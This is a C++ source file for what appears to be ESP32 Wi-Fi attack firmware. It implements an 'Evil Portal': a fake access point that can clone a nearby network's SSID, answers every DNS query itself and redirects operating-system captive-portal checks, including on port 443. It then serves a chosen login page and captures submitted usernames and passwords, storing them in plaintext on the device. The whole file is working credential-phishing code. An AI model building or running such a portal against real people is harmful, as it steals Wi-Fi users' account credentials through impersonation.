/** @file EvilPortal.cpp @brief Local captive-portal example integration. */

#include "EvilPortal.h"
#include "../../../src/Devices/Storage/StorageDevice.h"
#include <ArduinoJson.h>

#include <cstdlib>
#include <cerrno>
#include <cstring>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

AsyncWebServer server(80);
// OS captive probes try HTTPS first; answer port 443 so the phone sees an
// intercepted TLS session instead of a dead host.
static int tlsProbeSocket = -1;

static constexpr const char *SUBMISSION_HISTORY_FILE = "/Captures/Portal/evilportal_submissions.jsonl";
static constexpr const char *LEGACY_SUBMISSION_HISTORY_FILE = "/evilportal_submissions.jsonl";
static constexpr size_t MAX_SUBMISSION_HISTORY = 20;

/** Initialize portal flags; call setup() before begin(). */
EvilPortal::EvilPortal() {
}

std::string EvilPortal::jsonEscape(const String &value) {
  std::string output;
  output.reserve(value.length() + 8);
  for (size_t i = 0; i < value.length(); ++i) {
    const char c = value[i];
    switch (c) {
      case '"': output += "\\\""; break;
      case '\\': output += "\\\\"; break;
      case '\n': output += "\\n"; break;
      case '\r': output += "\\r"; break;
      case '\t': output += "\\t"; break;
      default: output += c; break;
    }
  }
  return output;
}

bool EvilPortal::isRootHtml(const String &path) {
  String lowered = path;
  lowered.toLowerCase();
  return path.startsWith("/") && lowered.endsWith(".html") &&
         (path.indexOf('/', 1) < 0 || path.startsWith("/Portal/"));
}

bool EvilPortal::hasForm(const String &path) {
  File file = Devices::Storage.openFile(path.c_str(), "r");
  if (!file) return false;

  String tail;
  uint8_t chunk[128];
  while (file.available()) {
    const size_t count = file.read(chunk, sizeof(chunk));
    if (count == 0) break;

    String text = tail;
    for (size_t i = 0; i < count; ++i) text += static_cast<char>(chunk[i]);
    text.toLowerCase();
    if (text.indexOf("<form") >= 0) {
      file.close();
      return true;
    }
    tail = text.substring(text.length() > 4 ? text.length() - 4 : 0);
  }
  file.close();
  return false;
}

std::string EvilPortal::submissionJson(const SubmissionRecord &record) const {
  const String masked = record.password.isEmpty() ? "" : "******";
  return std::string("{\"timestamp\":") + std::to_string(record.timestamp) +
         ",\"page\":\"" + jsonEscape(record.page) +
         "\",\"username\":\"" + jsonEscape(record.username) +
         "\",\"passwordMasked\":\"" + jsonEscape(masked) + "\"}";
}

void EvilPortal::loadSubmissionHistory() {
  submissionHistory.clear();
  submissionCount = 0;
  if (!Devices::Storage.isRunning()) return;

  auto loadFile = [this](const char *historyPath) {
    File file = Devices::Storage.openFile(historyPath, "r");
    if (!file) return;

    while (file.available()) {
      const String line = file.readStringUntil('\n');
      if (line.isEmpty()) continue;
      JsonDocument document;
      if (deserializeJson(document, line)) continue;

      SubmissionRecord record{
        document["timestamp"] | 0U,
        document["page"] | "",
        document["username"] | "",
        document["password"] | ""
      };
      ++submissionCount;
      submissionHistory.push_back(record);
      while (submissionHistory.size() > MAX_SUBMISSION_HISTORY) submissionHistory.pop_front();
    }
    file.close();
  };

  // Keep legacy root records visible after storage folders are introduced.
  if (Devices::Storage.doesFileExist(LEGACY_SUBMISSION_HISTORY_FILE))
    loadFile(LEGACY_SUBMISSION_HISTORY_FILE);
  if (Devices::Storage.doesFileExist(SUBMISSION_HISTORY_FILE))
    loadFile(SUBMISSION_HISTORY_FILE);
}

void EvilPortal::recordSubmission() {
  SubmissionRecord record{millis(), this->target_html_name, this->user_name, this->password};
  const std::string line = std::string("{\"timestamp\":") + std::to_string(record.timestamp) +
                           ",\"page\":\"" + jsonEscape(record.page) +
                           "\",\"username\":\"" + jsonEscape(record.username) +
                           "\",\"password\":\"" + jsonEscape(record.password) + "\"}\n";
  if (!Devices::Storage.writeFileChunk(SUBMISSION_HISTORY_FILE,
                                        reinterpret_cast<const uint8_t *>(line.data()),
                                        line.size(), true)) {
    esp32m_println("Could not save Evil Portal submission history");
    return;
  }
  ++submissionCount;
  submissionHistory.push_back(record);
  while (submissionHistory.size() > MAX_SUBMISSION_HISTORY) submissionHistory.pop_front();
}

/**
 * @brief Reset runtime state and enumerate portal HTML files.
 * @return true when the file list is allocated successfully.
 * @note SD enumeration is optional and compiled only for boards with SD support.
 */
bool EvilPortal::setup() {
  if (portalStarted) stop();
  delete html_files;
  html_files = nullptr;
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;
  this->explicit_ap = false;
  this->loadSubmissionHistory();

  html_files = new LinkedList<String>();
  if (html_files == nullptr) {
    esp32m_println("Could not allocate Evil Portal file list");
    return false;
  }

  html_files->add("Back");

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      //esp32m_println("Evil Portal Found " + (String)html_files->size() + " HTML files");
    }
  #endif

  return true;
}

/**
 * @brief Select AP and HTML sources, then start the captive portal.
 * @param ssids Candidate SSIDs from the scanner.
 * @param access_points Candidate access points from the scanner.
 * @return true when both sources are valid and the portal starts.
 */
bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->setAP(ssids, access_points))
    return false;
  if (!this->setHtml())
    return false;
    
  return startPortal();
}

/** Stop DNS, HTTP, and soft-AP services and clear the running flag. */
void EvilPortal::stop() {
  if (portalStarted) {
    dnsServer.stop();
    server.end();
    if (tlsProbeSocket >= 0) { ::close(tlsProbeSocket); tlsProbeSocket = -1; }
    WiFi.softAPdisconnect(true);
    portalStarted = false;
  }
  runServer = false;
}

/** Return the last username/email submitted to the portal endpoint. */
String EvilPortal::get_user_name() {
  return this->user_name;
}

/** Return the last password submitted to the portal endpoint. */
String EvilPortal::get_password() {
  return this->password;
}

bool EvilPortal::setTargetHtml(const String &filename) {
  if (filename.indexOf('"') >= 0 || filename.indexOf('\\') >= 0 || filename.indexOf("..") >= 0) return false;
  String path = filename.startsWith("/") ? filename : "/" + filename;
  if (!Devices::Storage.isRunning() || !isRootHtml(path)) return false;
  const size_t size = Devices::Storage.getFileSize(path.c_str());
  if (!Devices::Storage.doesFileExist(path.c_str()) || size == 0 || size >= MAX_HTML_SIZE) return false;
  if (!hasForm(path)) return false;
  this->target_html_name = filename;
  this->using_serial_html = false;
  return true;
}

bool EvilPortal::setPortalSsid(const String &ssid) {
  String value = ssid;
  value.trim();
  if (value.isEmpty() || value.length() >= MAX_AP_NAME_SIZE) return false;
  for (size_t i = 0; i < value.length(); ++i) {
    const unsigned char character = static_cast<unsigned char>(value[i]);
    if (character < 0x20 || character == 0x7f) return false;
  }
  value.toCharArray(apName, MAX_AP_NAME_SIZE);
  this->has_ap = true;
  this->explicit_ap = true;
  return true;
}

String EvilPortal::getPortalSsid() const {
  return String(apName);
}

bool EvilPortal::setPortalPassword(const String &password) {
  String value = password;
  value.trim();
  explicit_password = true;
  if (value.isEmpty()) {
    apPassword[0] = '\0';
    return true;
  }
  if (value.length() < 8 || value.length() > 63) return false;
  for (size_t i = 0; i < value.length(); ++i) {
    const unsigned char character = static_cast<unsigned char>(value[i]);
    if (character < 0x20 || character == 0x7f) return false;
  }
  value.toCharArray(apPassword, sizeof(apPassword));
  return true;
}

String EvilPortal::getPortalIp() const {
  return portalStarted ? WiFi.softAPIP().toString() : String("4.3.2.1");
}

std::string EvilPortal::getFormFilesJson() const {
  std::string output = "{\"files\":[";
  bool first = true;
  if (Devices::Storage.isRunning()) {
    for (const auto &entry : Devices::Storage.listFiles()) {
      const String path = entry.c_str();
      if (!isRootHtml(path) || !hasForm(path)) continue;
      const int slash = path.lastIndexOf('/');
      const String name = slash >= 0 ? path.substring(slash + 1) : path;
      const size_t size = Devices::Storage.getFileSize(path.c_str());
      if (!first) output += ",";
      first = false;
      output += "{\"path\":\"" + jsonEscape(path) + "\",\"name\":\"" +
                jsonEscape(name) + "\",\"size\":" + std::to_string(size) +
                ",\"form\":true,\"available\":" +
                ((size > 0 && size < MAX_HTML_SIZE) ? "true" : "false") + "}";
    }
  }
  output += "]}";
  return output;
}

std::string EvilPortal::getStatusJson() const {
  String selectedPage = this->target_html_name;
  if (!portalStarted && selectedPage == "index.html") {
    const String defaultPath = "/index.html";
    if (!Devices::Storage.doesFileExist(defaultPath.c_str()) || !hasForm(defaultPath)) selectedPage = "";
  }
  std::string output = "{\"active\":" + std::string(portalStarted ? "true" : "false") +
                       ",\"selectedPage\":\"" + jsonEscape(selectedPage) +
                       "\",\"ssid\":\"" + jsonEscape(getPortalSsid()) +
                       "\",\"ip\":\"" + jsonEscape(getPortalIp()) +
                       "\",\"submissions\":" + std::to_string(submissionCount) + ",\"last\":";
  if (submissionHistory.empty()) {
    output += "null";
  } else {
    output += submissionJson(submissionHistory.back());
  }
  output += ",\"history\":[";
  for (size_t i = submissionHistory.size(); i > 0; --i) {
    if (i != submissionHistory.size()) output += ",";
    output += submissionJson(submissionHistory[i - 1]);
  }
  output += "]}";
  return output;
}

bool EvilPortal::clearSubmissionHistory() {
  if (!Devices::Storage.isRunning()) return false;
  if (Devices::Storage.doesFileExist(SUBMISSION_HISTORY_FILE) &&
      !Devices::Storage.deleteFile(SUBMISSION_HISTORY_FILE)) return false;
  if (Devices::Storage.doesFileExist(LEGACY_SUBMISSION_HISTORY_FILE) &&
      !Devices::Storage.deleteFile(LEGACY_SUBMISSION_HISTORY_FILE)) return false;
  submissionHistory.clear();
  submissionCount = 0;
  this->user_name = "";
  this->password = "";
  return true;
}

/** Register the portal page and form-submission routes once. */
void CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
  // A redirect is the canonical captive signal; some ROMs only show the
  // sign-in sheet for a 3xx answer, so send them to the portal page.
  request->redirect(String("http://") + WiFi.softAPIP().toString());
}

void EvilPortal::setupServer() {
  if (serverConfigured) return;
  server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
    #ifdef HAS_SCREEN
      this->sendToDisplay("Client connected to server");
    #endif
  });

  auto handleSubmission = [this](AsyncWebServerRequest *request) {
    auto readParam = [request](const char *const *names, size_t count, bool &found) {
      for (size_t i = 0; i < count; ++i) {
        if (request->hasParam(names[i])) {
          found = true;
          return request->getParam(names[i])->value();
        }
        if (request->hasParam(names[i], true)) {
          found = true;
          return request->getParam(names[i], true)->value();
        }
      }
      return String();
    };

    static const char *const userNames[] = {"email", "username", "user", "login"};
    static const char *const passwordNames[] = {"password", "pass", "passwd"};
    bool userFound = false;
    bool passwordFound = false;
    const String user = readParam(userNames, sizeof(userNames) / sizeof(userNames[0]), userFound);
    const String password = readParam(passwordNames, sizeof(passwordNames) / sizeof(passwordNames[0]), passwordFound);
    if (userFound) {
      this->user_name = user;
      this->name_received = true;
    }
    if (passwordFound) {
      this->password = password;
      this->password_received = true;
    }
    request->send(
      200, "text/html",
      "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  };
  server.on("/get", HTTP_GET, handleSubmission);
  server.on("/get", HTTP_POST, handleSubmission);
  server.on("/login", HTTP_ANY, handleSubmission);
  server.on("/submit", HTTP_ANY, handleSubmission);
  server.on("/connecttest.txt", [](AsyncWebServerRequest *request) { request->redirect("http://logout.net"); });
  server.on("/wpad.dat", [](AsyncWebServerRequest *request) { request->send(404); });
  server.on("/generate_204", [](AsyncWebServerRequest *request) { request->redirect(String("http://") + WiFi.softAPIP().toString()); });
  server.on("/redirect", [](AsyncWebServerRequest *request) { request->redirect(String("http://") + WiFi.softAPIP().toString()); });
  server.on("/hotspot-detect.html", [](AsyncWebServerRequest *request) { request->redirect(String("http://") + WiFi.softAPIP().toString()); });
  server.on("/canonical.html", [](AsyncWebServerRequest *request) { request->redirect(String("http://") + WiFi.softAPIP().toString()); });
  server.on("/success.txt", [](AsyncWebServerRequest *request) { request->send(200); });
  server.on("/ncsi.txt", [](AsyncWebServerRequest *request) { request->redirect(String("http://") + WiFi.softAPIP().toString()); });
  server.on("/favicon.ico", [](AsyncWebServerRequest *request) { request->send(404); });
  // Must be registered last: this catch-all would otherwise shadow the OS
  // captive-probe routes above and the sign-in sheet never appears.
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  esp32m_println("web server up");
  serverConfigured = true;
}

/** Read bounded portal HTML from Serial during a one-second input window. */
void EvilPortal::setHtmlFromSerial() {
  esp32m_println("Setting HTML from serial...");
  String html;
  const unsigned long deadline = millis() + 1000;
  bool truncated = false;
  while (static_cast<long>(millis() - deadline) < 0) {
    while (Serial.available()) {
      const char c = static_cast<char>(Serial.read());
      if (html.length() < MAX_HTML_SIZE - 1) html += c;
      else truncated = true;
    }
    delay(1);
  }
  if (truncated) {
    esp32m_println("Provided HTML is too large");
    this->has_html = false;
    this->using_serial_html = false;
    return;
  }
  html.toCharArray(index_html, MAX_HTML_SIZE);
  this->has_html = true;
  this->using_serial_html = true;
  esp32m_println("html set");
}

/**
 * @brief Load the selected HTML page from SD when serial HTML is not active.
 * @return true when a valid page fits in the fixed HTML buffer.
 */
bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    esp32m_println("html previously set");
    return true;
  }
  esp32m_println("Setting HTML...");
  #ifdef HAS_SD
    const String html_path = this->target_html_name.startsWith("/")
      ? this->target_html_name : "/" + this->target_html_name;
    File html_file = sd_obj.getFile(html_path);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find " + html_path);
      this->sendToDisplay("Touch to exit...");
    #endif
    esp32m_println("Could not find " + html_path + ". Use stopscan...");
    return false;
  }
  else {
    if (html_file.size() >= MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given HTML is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      esp32m_println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
      html_file.close();
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    html.toCharArray(index_html, MAX_HTML_SIZE);
    this->has_html = true;
    esp32m_println("html set");
    html_file.close();
    return true;
  }

}

/**
 * @brief Resolve the AP name using scanner lists, then the SD fallback file.
 * @param ssids Candidate SSIDs; the first entry has priority.
 * @param access_points Candidate AP records used when no SSID is supplied.
 * @return true when a bounded AP name is selected.
 * @note Input length is checked before copying into the fixed global buffer.
 */
bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (ssids == nullptr || access_points == nullptr) return false;
  if (this->explicit_ap && this->has_ap) {
    esp32m_println("Portal AP name: " + String(apName));
    return true;
  }
  // See if there are selected APs first
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    #ifdef HAS_SD
      File ap_config_file = sd_obj.getFile("/ap.config.txt");
    #else
      File ap_config_file;
    #endif
    // Could not open config file. return false
    if (!ap_config_file) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("Could not find /ap.config.txt.");
        this->sendToDisplay("Touch to exit...");
      #endif
      esp32m_println("Could not find /ap.config.txt. Use stopscan...");
      return false;
    }
    // Config file good. Proceed
    else {
      // ap name too long. return false        
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          this->sendToDisplay("The given AP name is too large.");
          this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
          this->sendToDisplay("Touch to exit...");
        #endif
        esp32m_println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
        return false;
      }
      // AP name length good. Read from file into var
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        esp32m_print(c);
        if (isPrintable(c)) {
          ap_config.concat(c);
        }
      }
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from config file");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      esp32m_println("AP name from config file: " + ap_config);
      ap_config_file.close();
    }
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      esp32m_println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay("AP name from SSID list");
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    esp32m_println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      esp32m_println("The given AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from AP list");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      esp32m_println("AP name from AP list: " + ap_config);
    }
  }
  else {
    esp32m_println("Could not configure Access Point. Use stopscan...");
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not configure Access Point.");
      this->sendToDisplay("Touch to exit...");
    #endif
  }

  if (ap_config != "") {
    if (ap_config.length() >= MAX_AP_NAME_SIZE) {
      esp32m_println("The provided AP name is too large");
      return false;
    }
    ap_config.toCharArray(apName, MAX_AP_NAME_SIZE);
    this->has_ap = true;
    esp32m_println("ap config set");
    return true;
  }
  else
    return false;

}

#ifdef ESP_NETIF_CAPTIVEPORTAL_URI
#warning Looks like you can now use captive portal DHCP options

/** Advertise the portal URI through DHCP option 114 when supported. */
static void dhcp_set_captiveportal_url(String apName, String uri) {
    const char* captiveportal_uri = uri.c_str();

    // get a handle to configure DHCP with
    esp_netif_t* netif = esp_netif_get_handle_from_ifkey(apName.c_str());

    // set the DHCP option 114
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_netif_dhcps_stop(netif));
    ESP_ERROR_CHECK(esp_netif_dhcps_option(netif, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, captiveportal_uri, strlen(captiveportal_uri)));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_netif_dhcps_start(netif));
}
#endif

/** Configure the local soft AP, DNS wildcard, and captive-probe routes. */
bool EvilPortal::startAP() {
  const IPAddress AP_IP(4, 3, 2, 1);

  esp32m_print("starting ap ");
  esp32m_println(apName);

  WiFi.mode(WIFI_AP);
  // The fifth argument is the DNS server handed to DHCP clients. Without it no
  // client can resolve anything, so the OS captive check never runs.
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0), IPAddress(), AP_IP);
  if (!WiFi.softAP(apName, apPassword[0] == '\0' ? nullptr : apPassword)) {
    esp32m_println("Could not start portal AP");
    return false;
  }

  #ifdef HAS_SCREEN
    this->sendToDisplay("AP started");
  #endif

  esp32m_print("ap ip address: ");
  esp32m_println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  // Captive probe routes are registered once in setupServer().

  server.begin();
  if (tlsProbeSocket < 0)
  {
    tlsProbeSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (tlsProbeSocket >= 0)
    {
      const int reuse = 1;
      setsockopt(tlsProbeSocket, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
      struct sockaddr_in probeAddr = {};
      probeAddr.sin_family = AF_INET;
      probeAddr.sin_addr.s_addr = INADDR_ANY;
      probeAddr.sin_port = htons(443);
      if (bind(tlsProbeSocket, (struct sockaddr *)&probeAddr, sizeof(probeAddr)) != 0 ||
          listen(tlsProbeSocket, 2) != 0)
      {
        esp32m_print("tls probe failed: ");
        esp32m_println(strerror(errno));
        ::close(tlsProbeSocket);
        tlsProbeSocket = -1;
      }
      else
      {
        fcntl(tlsProbeSocket, F_SETFL, O_NONBLOCK);
      }
    }
  }
  portalStarted = true;
  #ifdef HAS_SCREEN
    this->sendToDisplay("Evil Portal READY");
  #endif
  return true;
}

/** Start the AP services and enable portal request processing. */
bool EvilPortal::startPortal() {
  // wait for flipper input to get config index
  if (!this->startAP()) return false;

  this->runServer = true;
  return true;
}

/** Show a padded status message on the optional device display. */
void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
  #endif
}

/**
 * @brief Service DNS and persist a complete portal form submission.
 * @param scan_mode Current scanner mode; processing occurs only in portal mode.
 * @note The loop is cooperative and must be called by the firmware main loop.
 */
void EvilPortal::main(uint8_t scan_mode) {
  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
    this->dnsServer.processNextRequest();
    if (tlsProbeSocket >= 0)
    {
      struct sockaddr_in peer = {};
      socklen_t peerLen = sizeof(peer);
      const int probeClient = accept(tlsProbeSocket, (struct sockaddr *)&peer, &peerLen);
      if (probeClient >= 0)
      {
        // A plain HTTP answer on a TLS port trips the OS portal heuristic.
        const char *reply = "HTTP/1.1 302 Found\r\nLocation: http://4.3.2.1/\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        send(probeClient, reply, strlen(reply), 0);
        ::close(probeClient);
      }
    }
    if (this->name_received && this->password_received) {
      this->name_received = false;
      this->password_received = false;
      String logValue1 =
          "u: " + this->user_name;
      String logValue2 = "p: " + this->password;
      String full_string = logValue1 + " " + logValue2 + "\n";
      esp32m_print(full_string);
      buffer_obj.append(full_string);
      this->recordSubmission();
      #ifdef HAS_SCREEN
        this->sendToDisplay(full_string);
      #endif
    }
  }
}
